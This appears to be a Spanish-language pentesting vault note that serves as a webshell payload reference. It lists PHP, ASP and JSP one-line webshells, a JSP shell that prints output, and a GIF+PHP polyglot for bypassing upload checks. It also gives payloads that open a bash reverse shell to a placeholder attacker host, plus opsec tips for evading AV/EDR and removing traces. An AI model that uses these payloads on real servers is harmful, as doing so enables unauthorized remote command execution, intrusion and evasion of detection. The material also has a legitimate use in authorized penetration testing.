---
tipo: meta
aliases:
  - Payloads webshell
  - web shells
tags:
  - meta/referencia
  - dominio/web
---

# Webshells - matriz de referencia

> [!info] Referencia pura, no un zettel
> El payload server-side que subís o incluís — el valor "sin socket" del eje de dirección. Criterio webshell vs reverse shell en [[Webshell]] y [[MOC - Shells]]; cómo llega el archivo al server, en [[MOC - File upload]] y [[File upload bypass - matriz de referencia]]. `yi``  ` copia el contenido entre backticks.

`c` es el parámetro; `ATACANTE`/`PUERTO` tu IP y puerto. Sin datos de objetivo real — regla del vault.

## One-liner por lenguaje

| Lenguaje | Payload | Uso / nota |
|---|---|---|
| PHP `system` | `<?php system($_GET['c']); ?>` | `?c=id`. El clásico, imprime la salida |
| PHP `shell_exec` | `<?php echo shell_exec($_GET['c']); ?>` | Devuelve la salida completa como string |
| PHP `passthru` | `<?php passthru($_GET['c']); ?>` | Fallback si `system` está en `disable_functions` |
| PHP backticks | ``<?=`$_GET[c]`?>`` | Operador de ejecución. El más corto |
| PHP `eval` (POST) | `<?php eval($_POST['c']); ?>` | Por POST: no queda en el access.log como query string |
| ASP clásico | `<%eval request("c")%>` | IIS heredado |
| JSP | `<% Runtime.getRuntime().exec(request.getParameter("c")); %>` | Ejecuta, no imprime la salida (ver abajo) |

## Disparar la reverse shell desde el webshell

Lo propio de webshell es **cómo se dispara**; el catálogo de reverse shells por lenguaje vive en [[Reverse y bind shells - matriz de referencia]], y la estabilización a TTY en [[Estabilización de shell - matriz de referencia]].

| Forma | Payload | Nota |
|---|---|---|
| Payload PHP subido | `<?php system("bash -c 'bash -i >& /dev/tcp/ATACANTE/PUERTO 0>&1'"); ?>` | Lanza la reversa al ejecutarse. En el atacante: `nc -lvnp PUERTO` |
| Por el parámetro (URL-enc) | `?c=bash+-c+'bash+-i+>%26+/dev/tcp/ATACANTE/PUERTO+0>%261'` | Desde un webshell ya puesto. `&`→`%26`, espacio→`+` |

## Lo que no entra en una celda

**JSP que imprime la salida** — el `exec` de la tabla ejecuta pero no muestra nada; para ver el resultado hay que leer el stream:

```jsp
<%@ page import="java.util.*,java.io.*" %>
<% Process p=Runtime.getRuntime().exec(request.getParameter("c"));
   BufferedReader d=new BufferedReader(new InputStreamReader(p.getInputStream()));
   String l; while((l=d.readLine())!=null){ out.println(l); } %>
```

**Polyglot GIF+PHP** (para subir como imagen) — se guarda como `.jpg`/`.gif`, pasa la validación de imagen por los magic bytes y ejecuta si el server lo procesa como PHP:

```
GIF89a;
<?php system($_GET['c']); ?>
```

Ver [[File upload bypass - matriz de referencia]] § magic bytes.

> [!warning] `opsec: quemado` como payload persistente
> Un webshell dejado en disco es evidencia forense de primer nivel y lo levanta cualquier AV/EDR web. Para un engagement real: usar reverse shell en memoria y borrar el archivo subido apenas se ejecuta. Registrar en el informe qué se dejó y qué se limpió.

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| El archivo sube pero no ejecuta | cayó fuera de la raíz web, o el server no lo procesa como código | pasar a [[File upload + LFI]]; probar otra extensión |
| `system`/`exec` no devuelven nada | `disable_functions` | usar `passthru`/`shell_exec`, o la función que quede |
| Sin salida en el JSP con `exec` | no se lee el stream del proceso | usar el JSP que imprime la salida (§ arriba) |
| La reversa no vuelve | sin egress hacia el atacante | quedarse en comando por HTTP, o [[Shell - conexión bind]] tras pivote |
| El webshell desaparece | AV/EDR web lo detecta y lo borra | reverse shell en memoria; no dejar el archivo |
